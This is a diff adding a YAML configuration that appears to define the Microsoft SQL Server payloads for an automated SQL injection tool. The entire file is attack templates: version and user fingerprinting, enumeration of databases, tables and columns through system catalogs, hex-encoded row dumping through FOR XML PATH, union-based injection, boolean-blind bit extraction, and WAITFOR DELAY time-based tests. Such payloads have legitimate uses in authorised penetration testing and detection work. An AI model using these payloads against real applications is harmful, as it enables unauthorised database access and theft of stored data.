@@ -1,0 +1,237 @@
+vendor: ""
+resource: 
+ info: |
+  SELECT 
+      %20@@version
+      %2B'${ENCLOSE_VALUE_SQL}'
+      %2BDB_NAME()
+      %2B'${ENCLOSE_VALUE_SQL}'
+      %2Buser
+      %2B'${TRAIL_SQL}'
+ schema: 
+  database: |
+   SELECT 
+       replace(
+           CONVERT(
+               VARCHAR(MAX),
+               CONVERT(
+                   VARBINARY(MAX),
+                   '0'%2bSTUFF(
+                       (
+                           SELECT replace(sys.fn_varbintohexstr(CAST(
+                               ','
+                               %2b'${ENCLOSE_VALUE_SQL}'
+                               %2BCAST(name AS VARCHAR(MAX))
+                               %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                               AS VARBINARY(MAX)
+                           )),'0x','')
+                           FROM (
+                               select 
+                                   name,
+                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+                               from master..sysdatabases
+                           )x
+                           where 1=1
+                           {limit}
+                           FOR XML PATH('')
+                       ),
+                       1,
+                       1,
+                       ''
+                   ),
+                   2
+               )
+           ) 
+           %2B '${TRAIL_SQL}',
+           ',',
+           '${SEPARATOR_CELL_SQL}'
+       )
+  table: |
+   SELECT 
+       replace(
+           CONVERT(
+               VARCHAR(MAX),
+               CONVERT(
+                   VARBINARY(MAX),
+                   '0'%2bSTUFF(
+                       (
+                           SELECT replace(sys.fn_varbintohexstr(CAST(
+                               ','
+                               %2b'${ENCLOSE_VALUE_SQL}'
+                               %2BCAST(name AS VARCHAR(MAX))
+                               %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                               AS VARBINARY(MAX)
+                           )),'0x','')
+                           FROM (
+                               select 
+                                   name, 
+                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+                               from ${DATABASE}..sysobjects 
+                               WHERE xtype='U'
+                           )x
+                           where 1=1
+                           {limit}
+                           FOR XML PATH('')
+                       ),
+                       1,
+                       1,
+                       ''
+                   ),
+                   2
+               )
+           ) 
+           %2B '${TRAIL_SQL}',
+           ',',
+           '${SEPARATOR_CELL_SQL}'
+       )
+  column: |
+   SELECT 
+       replace(
+           CONVERT(
+               VARCHAR(MAX),
+               CONVERT(
+                   VARBINARY(MAX),
+                   '0'%2bSTUFF(
+                       (
+                           SELECT replace(sys.fn_varbintohexstr(CAST(
+                               ','
+                               %2b'${ENCLOSE_VALUE_SQL}'
+                               %2BCAST(name AS VARCHAR(MAX))
+                               %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                               AS VARBINARY(MAX)
+                           )),'0x','')
+                           FROM (
+                               select 
+                                   c.name, 
+                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+                               FROM
+                                   ${DATABASE}..syscolumns c,
+                                   ${DATABASE}..sysobjects t
+                               WHERE c.id=t.id
+                               AND t.name='${TABLE}'
+                           )x
+                           where 1=1
+                           {limit}
+                           FOR XML PATH('')
+                       ),
+                       1,
+                       1,
+                       ''
+                   ),
+                   2
+               )
+           )
+           %2B '${TRAIL_SQL}',
+           ',',
+           '${SEPARATOR_CELL_SQL}'
+       )
+  row: 
+   query: |
+    SELECT 
+        replace(
+            CONVERT(
+                VARCHAR(MAX),
+                CONVERT(
+                    VARBINARY(MAX),
+                    '0'%2bSTUFF(
+                        (
+                            SELECT 
+                                replace(sys.fn_varbintohexstr(CAST(
+                                    ','
+                                    %2b'${ENCLOSE_VALUE_SQL}'
+                                    %2BCAST(${FIELDS} AS VARCHAR(MAX))
+                                    %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                    AS VARBINARY(MAX)
+                                )),'0x','')
+                            FROM (
+                                select 
+                                    *, 
+                                    ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+                                FROM ${DATABASE}.dbo.${TABLE}
+                            )x
+                            where 1=1
+                            {limit}
+                            FOR XML PATH('')
+                        ),
+                        1,
+                        1,
+                        ''
+                    ),
+                    2
+                )
+            )
+            %2B '${TRAIL_SQL}',
+            ',',
+            '${SEPARATOR_CELL_SQL}'
+        )
+   fields: 
+    field: |
+     LTRIM(
+         RTRIM(
+             coalesce(
+                 ${FIELD}, 
+                 ''
+             )
+         )
+     )
+    concat: "%2b '%7f' %2b"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   (
+       select 
+           '${LEAD}'
+           %2Bsubstring(
+               (${INJECTION}), 
+               ${INDEX}, 
+               65536
+           )
+   )
+  limit: "and rnum BETWEEN ${LIMIT} AND 65536"
+  failsafe: "CONVERT(varchar, (1337${INDICE}7330%2b1))"
+  calibrator: "replicate(${CALIBRATOR_HEX}, 1024)"
+  limitBoundary: 1
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "[Microsoft][SQL Server"
+    - "SQL Server"
+ normal: 
+  indices: "union select ${INDICES}"
+  capacity: "(select concat('${LEAD}${INDICE}', ${CALIBRATOR}))"
+  orderBy: "order by 1337"
+ boolean: 
+  test: 
+   falses: 
+    - "1 = 0"
+    - "'a' %21= 'a'"
+    - "'b' %21= 'b'"
+    - "1 = 2"
+    - "1 %21= 1"
+    - "2 %21= 2"
+   trues: 
+    - "1 = 1"
+    - "0 = 0"
+    - "'a' %21= 'b'"
+    - "'a' = 'a'"
+    - "2 = 2"
+    - "1 %21= 2"
+   initialization: "0%2b1 = 1"
+   bit: |
+    0 != (
+        ascii(
+            substring(
+                ${INJECTION}, 
+                ${INDEX}, 
+                1
+            )
+        ) 
+        %26 ${BIT}
+    )
+   length: "len(${INJECTION}) > ${INDEX}"
+  blind: "and ${TEST}"
+  time: |
+   ; if (${TEST}) 
+       WAITFOR DELAY '00:00:00' 
+   else 
+       WAITFOR DELAY '00:00:${SLEEP_TIME}'
